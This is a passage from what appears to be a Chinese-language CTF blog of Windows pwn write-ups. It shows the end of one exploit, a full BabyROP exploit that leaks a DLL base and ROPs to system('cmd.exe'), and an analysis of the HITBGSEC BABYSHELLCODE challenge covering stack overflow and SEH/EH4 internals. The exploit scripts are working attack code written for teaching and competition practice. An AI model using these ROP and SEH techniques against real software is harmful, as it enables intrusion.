class="number">0x6d59</span>) <span class="comment"># pop ebp; ret</span></span><br><span class="line">payload += <span class="string">"A"</span> * <span class="number">0x14</span> <span class="comment"># pop args</span></span><br><span class="line">payload += p32(ebp + <span class="number">0x34</span>)</span><br><span class="line">payload += p32(PIE + <span class="number">0x6D3E</span>) <span class="comment"># return address (ReadFile)</span></span><br><span class="line">payload += p32(PIE + <span class="number">0x6301C</span>) + p32(<span class="number">0x100</span>) + p32(<span class="number">0</span>) * <span class="number">2</span> <span class="comment"># args for ReadFile</span></span><br><span class="line">payload += p32(GS ^ (ebp + <span class="number">0x34</span>))</span><br><span class="line">payload += p32(<span class="number">0</span>) <span class="comment"># where ebp points to</span></span><br><span class="line">payload += p32(PIE + backdoor) <span class="comment"># return to backdoor</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># write "./flag.txt"</span></span><br><span class="line">payload = <span class="string">"./flag.txt\x00"</span></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">print(<span class="string">"[*] cookie: %s"</span> % hex(cookie))</span><br><span class="line">print(<span class="string">"[*] ebp: %s"</span> % hex(ebp))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="Windows-Others-BabyROP"><a href="#Windows-Others-BabyROP" class="headerlink" title="[Windows][Others]BabyROP"></a>[Windows][Others]BabyROP</h1><h2 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h2><p>整个程序逻辑很简单，也没开GS保护：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    FILE *v3; <span class="comment">// eax</span></span><br><span class="line">    <span class="keyword">int</span> i; <span class="comment">// esi</span></span><br><span class="line">    <span class="keyword">char</span> v5; <span class="comment">// al</span></span><br><span class="line">    FILE *v6; <span class="comment">// eax</span></span><br><span class="line">    FILE *v7; <span class="comment">// eax</span></span><br><span class="line">    <span class="keyword">int</span> v8; <span class="comment">// esi</span></span><br><span class="line">    <span class="keyword">int</span> j; <span class="comment">// ebx</span></span><br><span class="line">    <span class="keyword">char</span> v10; <span class="comment">// al</span></span><br><span class="line">    FILE *v11; <span class="comment">// eax</span></span><br><span class="line">    <span class="keyword">char</span> v13[<span class="number">100</span>]; <span class="comment">// [esp+Ch] [ebp-CCh] BYREF</span></span><br><span class="line">    <span class="keyword">char</span> v14[<span class="number">100</span>]; <span class="comment">// [esp+70h] [ebp-68h] BYREF</span></span><br><span class="line">    <span class="keyword">int</span> v15; <span class="comment">// [esp+D4h] [ebp-4h] BYREF</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"input your name"</span>);</span><br><span class="line">    v3 = _iob_func();</span><br><span class="line">    fflush(v3 + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">100</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">        v5 = getchar();</span><br><span class="line">        <span class="keyword">if</span> ( v5 == <span class="number">10</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        v14[i] = v5;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"hello %s\n"</span>, v14);</span><br><span class="line">    v6 = _iob_func();</span><br><span class="line">    fflush(v6 + <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"input your message length"</span>);</span><br><span class="line">    v7 = _iob_func();</span><br><span class="line">    fflush(v7 + <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d\n"</span>, &amp;v15);</span><br><span class="line">    v8 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ( j = v15; v8 &lt; j; v13[v8++] = v10 )</span><br><span class="line">    &#123;</span><br><span class="line">        v10 = getchar();</span><br><span class="line">        <span class="keyword">if</span> ( v10 == <span class="number">10</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"leave your message"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"your mesage is %s\n"</span>, v13);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"press enter to exit\n"</span>);</span><br><span class="line">    v11 = _iob_func();</span><br><span class="line">    fflush(v11 + <span class="number">1</span>);</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先输入的name没有末尾补0，所以可以利用这个leak出栈上残留的数据。<br>其次后面直接给了一次栈溢出的机会。</p><h2 id="利用思路-1"><a href="#利用思路-1" class="headerlink" title="利用思路"></a>利用思路</h2><ol><li>name的buffer后偏移为0x64的地方存有MSVCR100.dll中函数的地址，利用这个将MSVCR100.dll的基地址算出来，并得到MSVCR100.dll中的<code>system</code>和”cmd.exe”的地址。</li><li>利用栈溢出直接劫持返回地址，布置ROP执行<code>system(&quot;cmd.exe&quot;)</code>。</li></ol><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> winpwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = <span class="string">'i386'</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./babyrop.exe"</span>)</span><br><span class="line"><span class="keyword">if</span> len(sys.argv) == <span class="number">2</span> <span class="keyword">and</span> sys.argv[<span class="number">1</span>] == <span class="string">'1'</span>:</span><br><span class="line">    windbgx.attach(p)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = remote("node3.buuoj.cn", 29890) </span></span><br><span class="line"></span><br><span class="line">str_cmd_exe = <span class="number">0x1ED0</span></span><br><span class="line">system_offset = <span class="number">0x307FB</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak PIE</span></span><br><span class="line">payload = <span class="string">"A"</span> * <span class="number">0x63</span> + <span class="string">"@"</span></span><br><span class="line">p.sendlineafter(<span class="string">"input your name"</span>, payload)</span><br><span class="line">p.recvuntil(<span class="string">"@"</span>)</span><br><span class="line">dll_base = u32(p.recv(<span class="number">4</span>)) - <span class="number">0x261b1</span></span><br><span class="line">system = dll_base + system_offset</span><br><span class="line">cmd_exe = dll_base + str_cmd_exe</span><br><span class="line"></span><br><span class="line"><span class="comment"># getshell</span></span><br><span class="line">p.sendlineafter(<span class="string">"input your message length"</span>, str(<span class="number">0x100</span>))</span><br><span class="line">payload = <span class="string">'A'</span> * <span class="number">0xCC</span> + p32(<span class="number">0</span>) + p32(system) + p32(<span class="number">0</span>) + p32(cmd_exe)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendlineafter(<span class="string">"press enter to exit"</span>, <span class="string">""</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">"[*] dll_base: %s"</span> % hex(dll_base))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="Windows-HITBGSEC-BABYSHELLCODE"><a href="#Windows-HITBGSEC-BABYSHELLCODE" class="headerlink" title="[Windows][HITBGSEC]BABYSHELLCODE"></a>[Windows][HITBGSEC]BABYSHELLCODE</h1><h2 id="题目分析-2"><a href="#题目分析-2" class="headerlink" title="题目分析"></a>题目分析</h2><p>程序开始的时候，先做一个简单的初始化操作：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">init</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    _DWORD *v0; <span class="comment">// ebx</span></span><br><span class="line">    FILE *v1; <span class="comment">// eax</span></span><br><span class="line">    FILE *v2; <span class="comment">// eax</span></span><br><span class="line">    <span class="keyword">int</span> v3; <span class="comment">// ecx</span></span><br><span class="line"></span><br><span class="line">    v0 = <span class="built_in">malloc</span>(<span class="number">0x80</span>u);</span><br><span class="line">    v1 = _acrt_iob_func(<span class="number">1u</span>);</span><br><span class="line">    setvbuf(v1, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>);</span><br><span class="line">    v2 = _acrt_iob_func(<span class="number">0</span>);</span><br><span class="line">    setvbuf(v2, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> ( init_scmgr() &lt; <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"error to init scmgr!"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    v3 = <span class="number">1</span>;</span><br><span class="line">    *v0 = init_scmgr;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        v0[v3] = <span class="number">0x10DCD</span> * v0[v3 - <span class="number">1</span>];</span><br><span class="line">        ++v3;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v3 &lt; <span class="number">32</span> );</span><br><span class="line">    key = <span class="number">0</span>;</span><br><span class="line">    qmemcpy(buf, v0, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    <span class="built_in">free</span>(v0);</span><br><span class="line">    enabled = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Hey, Welcome to shellcode test system!"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里调用了一个自实现的<code>scmgr.dll</code>中的<code>scmgr_init</code>函数，以及利用<code>init_scmgr</code>的地址初始化了一个<code>int[32]</code>的buffer。</p><p>其中<code>scmgr_init</code>实现如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">init_scmgr</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    LPVOID v0; <span class="comment">// eax</span></span><br><span class="line">    <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">SYSTEM_INFO</span> <span class="title">SystemInfo</span>;</span> <span class="comment">// [esp+0h] [ebp-24h] BYREF</span></span><br><span class="line"></span><br><span class="line">    GetSystemInfo(&amp;SystemInfo);</span><br><span class="line">    page_size = SystemInfo.dwPageSize;</span><br><span class="line">    max_size = <span class="number">20</span> * SystemInfo.dwPageSize;</span><br><span class="line">    v0 = VirtualAlloc(<span class="number">0</span>, <span class="number">20</span> * SystemInfo.dwPageSize, <span class="number">0x1000</span>u, <span class="number">0x40</span>u);</span><br><span class="line">    addr = (<span class="keyword">int</span>)v0;</span><br><span class="line">    <span class="keyword">if</span> ( v0 )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Global memory alloc at %p\n"</span>, (<span class="keyword">char</span>)v0);</span><br><span class="line">        result = addr;</span><br><span class="line">        buffer_start = addr;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Error to alloc globalmemory"</span>);</span><br><span class="line">        result = <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也就是分配出了20个page的内存供后续使用。</p><p>后面菜单提供<code>add</code>，<code>show</code>，<code>delete</code>，<code>run</code>四个基本功能，顾名思义，就是添加、打印、删除、执行shellcode的操作。<br>比较关键的是<code>run</code>这里：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">run</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> v0; <span class="comment">// ebx</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">struct_shellcode</span> *<span class="title">v1</span>;</span> <span class="comment">// edi</span></span><br><span class="line">    <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">    _DWORD *v3; <span class="comment">// esi</span></span><br><span class="line">    <span class="keyword">char</span> Src[<span class="number">100</span>]; <span class="comment">// [esp+10h] [ebp-80h] BYREF</span></span><br><span class="line">    CPPEH_RECORD ms_exc; <span class="comment">// [esp+78h] [ebp-18h]</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(Src, <span class="number">0</span>, <span class="keyword">sizeof</span>(Src));</span><br><span class="line">    ms_exc.registration.TryLevel = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"shellcode index:"</span>);</span><br><span class="line">    v0 = read_n();</span><br><span class="line">    v1 = shellcode_array[v0];</span><br><span class="line">    <span class="keyword">if</span> ( v1 )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( enabled )</span><br><span class="line">        &#123;</span><br><span class="line">            v3 = (_DWORD *)v1-&gt;code;</span><br><span class="line">            <span class="built_in">memcpy</span>(Src, v3, v1-&gt;length);</span><br><span class="line">            *v3 = <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ((<span class="keyword">void</span> (__thiscall *)(<span class="keyword">int</span>))v1-&gt;code)(v1-&gt;code);</span><br><span class="line">        <span class="keyword">if</span> ( enabled )</span><br><span class="line">            <span class="built_in">memcpy</span>((<span class="keyword">void</span> *)shellcode_array[v0]-&gt;code, Src, shellcode_array[v0]-&gt;length);</span><br><span class="line">        result = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"invalid index"</span>);</span><br><span class="line">        ms_exc.registration.TryLevel = <span class="number">-2</span>;</span><br><span class="line">        result = <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>enabled == 1</code>的情况下（其实总是1），调用<code>memcpy(Src, v3, v1-&gt;length);</code>向栈上的<code>Src</code>复制了一段shellcode，而这个shellcode的长度显然可以超过<code>Src</code>的长度100，所以这里存在一个栈溢出；其次，后面<code>((void (__thiscall *)(int))v1-&gt;code)(v1-&gt;code);</code>执行shellcode前，<code>*v3 = -1;</code>首先将shellcode的前4 bytes置了<code>0xFFFFFFFF</code>，所以肯定会触发错误，从而陷入到错误处理函数中执行，这里就涉及到windows的SEH机制。</p><h2 id="SEH-Structured-Exception-Handling"><a href="#SEH-Structured-Exception-Handling" class="headerlink" title="SEH (Structured Exception Handling)"></a>SEH (Structured Exception Handling)</h2><p>SEH(Structured Exception Handling)结构化异常处理是windows的一种异常处理机制，C语言中主要通过<code>try &amp; catch</code>实现。<br>在代码层面，windows相应的函数栈上也会布置一种特殊的结构：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">CPPEH_RECORD</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    DWORD old_esp;  </span><br><span class="line">    DWORD exc_ptr;  </span><br><span class="line">    _EH3_EXCEPTION_REGISTRATION registration;</span><br><span class="line">&#125;CPPEH_RECORD, *PCPPEH_RECORD;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">EH3_EXCEPTION_REGISTRATION</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">　　<span class="class"><span class="keyword">struct</span> _<span class="title">EH3_EXCEPTION_REGISTRATION</span> *<span class="title">Next</span>;</span></span><br><span class="line">　　PVOID ExceptionHandler;</span><br><span class="line">　　PSCOPETABLE_ENTRY scopeTable;</span><br><span class="line">　　DWORD TryLevel;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>其中:</p><ul><li><code>prev</code>指向下一个<code>EXCEPTION_FRAME</code>。</li><li><code>handler</code>为异常处理函数<code>_except_handler4</code>。</li><li><code>scopetable</code>是一个指针，指向<code>PSCOPETABLE_ENTRY</code>，在这里开启GS保护的情况下，它是：  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">EH4_SCOPETABLE</span> &#123;</span></span><br><span class="line">    DWORD GSCookieOffset;</span><br><span class="line">    DWORD GSCookieXOROffset;</span><br><span class="line">    DWORD EHCookieOffset;</span><br><span class="line">    DWORD EHCookieXOROffset;</span><br><span class="line">    _EH4_SCOPETABLE_RECORD ScopeRecord[<span class="number">1</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">EH4_SCOPETABLE_RECORD</span> &#123;</span></span><br><span class="line">    DWORD EnclosingLevel;</span><br><span class="line">    <span class="keyword">long</span> (*FilterFunc)();</span><br><span class="line">        <span class="keyword">union</span> &#123;</span><br><span class="line">        <span class="keyword">void</span> (*HandlerAddress)();</span><br><span class="line">        <span class="keyword">void</span> (*FinallyFunc)();</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li><li><code>TryLevel</code>可以视为对相应<code>_EH4_SCOPETABLE</code>中<code>_EH4_SCOPETABLE_RECORD</code>的一个索引。</li></ul><p>从栈的布局上看（借用一张图），为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">                                                ExceptionPointers</span><br><span class="line">                                              +-------------------+</span><br><span class="line">                                  +----------&gt;|  ExceptionRecord  |</span><br><span class="line">                                  |           +-------------------+</span><br><span class="line">                                  |           |   ContextRecord   |</span><br><span class="line">                                  |           +-------------------+</span><br><span class="line">                EH4 Stack         |</span><br><span class="line">          +-------------------+   |                Scope Table</span><br><span class="line">Low       |      ......       |   |           +-------------------+</span><br><span class="line">          +-------------------+   |           |  GSCookieOffset   |</span><br><span class="line">ebp - 18h |        esp        |   |           +-------------------+</span><br><span class="line">          +-------------------+   |           | GSCookieXorOffset |</span><br><span class="line">ebp - 14h | ExceptionPointers |---+           +-------------------+</span><br><span class="line">          +-------------------+               |  EHCookieOffset   |</span><br><span class="line">ebp - 10h |       Next        |               +-------------------+</span><br><span class="line">          +-------------------+               | EHCookieXorOffset |</span><br><span class="line">ebp - 0Ch | ExceptionHandler  |               +-------------------+ </span><br><span class="line">          +-------------------+   +----------&gt;|  EncloseingLevel  |---&gt; 0xFFFFFFFE </span><br><span class="line">ebp - 08h |    Scope Table    |   | Level 0   +-------------------+  </span><br><span class="line">          +-------------------+   |           |     FilterFunc    |  </span><br><span class="line">ebp - 04h |     TryLevel      |---+           +-------------------+ </span><br><span class="line">          +-------------------+   |           |    HandlerFunc    | </span><br><span class="line">ebp       |        ebp        |   |           +-------------------+  </span><br><span class="line">          +-------------------+   +----------&gt;|  EncloseingLevel  |---&gt; 0x00000000</span><br><span class="line">High      |      ......       |     Level 1   |-------------------+</span><br><span class="line">          +-------------------+               |     FilterFunc    |</span><br><span class="line">                                              +-------------------+</span><br><span class="line">                                              |    HandlerFunc    |</span><br><span class="line">                                              +-------------------+</span><br></pre></td></tr></table></figure><p>检查<code>_EH3_EXCEPTION_REGISTRATION-&gt;prev</code>合法之后，会通过调用<code>_EH3_EXCEPTION_REGISTRATION-&gt;ExceptionHandler</code>，也就是<code>_except_handler4</code>函数进入异常处理流程：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">cdecl <span class="title">ValidateLocalCookies</span><span class="params">(<span class="keyword">void</span> (__fastcall *cookieCheckFunction)(<span class="keyword">unsigned</span> <span class="keyword">int</span>), _EH4_SCOPETABLE *scopeTable, <span class="keyword">char</span> *framePointer)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// esi@2</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> v4; <span class="comment">// esi@3</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> ( scopeTable-&gt;GSCookieOffset != <span class="number">-2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        v3 = *(_DWORD *)&amp;framePointer[scopeTable-&gt;GSCookieOffset] ^ (<span class="keyword">unsigned</span> <span class="keyword">int</span>)&amp;framePointer[scopeTable-&gt;GSCookieXOROffset];</span><br><span class="line">        __guard_check_icall_fptr(cookieCheckFunction);</span><br><span class="line">        ((<span class="keyword">void</span> (__thiscall *)(_DWORD))cookieCheckFunction)(v3);</span><br><span class="line">    &#125;</span><br><span class="line">    v4 = *(_DWORD *)&amp;framePointer[scopeTable-&gt;EHCookieOffset] ^ (<span class="keyword">unsigned</span> <span class="keyword">int</span>)&amp;framePointer[scopeTable-&gt;EHCookieXOROffset];</span><br><span class="line">    __guard_check_icall_fptr(cookieCheckFunction);</span><br><span class="line">    ((<span class="keyword">void</span> (__thiscall *)(_DWORD))cookieCheckFunction)(v4);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">int</span> __cdecl _except_handler4_common(<span class="keyword">unsigned</span> <span class="keyword">int</span> *securityCookies, <span class="keyword">void</span> (__fastcall *cookieCheckFunction)(<span class="keyword">unsigned</span> <span class="keyword">int</span>), _EXCEPTION_RECORD *exceptionRecord, <span class="keyword">unsigned</span> __int32 sehFrame, _CONTEXT *context)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// xor scope table</span></span><br><span class="line">    scopeTable_1 = (_EH4_SCOPETABLE *)(*securityCookies ^ *(_DWORD *)(sehFrame + <span class="number">8</span>));</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// sehFrame is the address of _EH3_EXCEPTION_REGISTRATION at stack</span></span><br><span class="line">    framePointer = (<span class="keyword">char</span> *)(sehFrame + <span class="number">16</span>);</span><br><span class="line">    scopeTable = scopeTable_1;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// Validate GS</span></span><br><span class="line">    ValidateLocalCookies(cookieCheckFunction, scopeTable_1, (<span class="keyword">char</span> *)(sehFrame + <span class="number">16</span>));</span><br><span class="line">    __except_validate_context_record(context);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> ( exceptionRecord-&gt;ExceptionFlags &amp; <span class="number">0x66</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        ......</span><br><span class="line">    &#125;</span><br><span class="line">  